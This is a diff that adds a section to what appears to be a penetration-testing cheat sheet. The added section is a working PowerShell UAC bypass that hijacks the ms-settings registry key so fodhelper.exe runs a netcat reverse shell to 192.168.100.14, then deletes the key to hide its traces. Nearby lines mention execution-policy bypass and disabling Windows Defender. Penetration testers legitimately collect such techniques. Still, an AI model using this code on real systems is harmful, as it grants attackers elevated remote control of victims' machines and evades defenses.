@@ -812,6 +812,22 @@ powershell.exe -ep bypass
 
 &nbsp;
 
+
+**[+] Bypass UAC via fodhelper.exe**
+
+```powershell
+// Credits goes to (netbiosX. - pentestlab.blog)
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd .exe /c C:\users\public\nc.exe 192.168.100.14 443 -e bypass" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+Start-Sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
+
+&nbsp;
+
 **[+] Disable windows defender**
 
 ```powershell
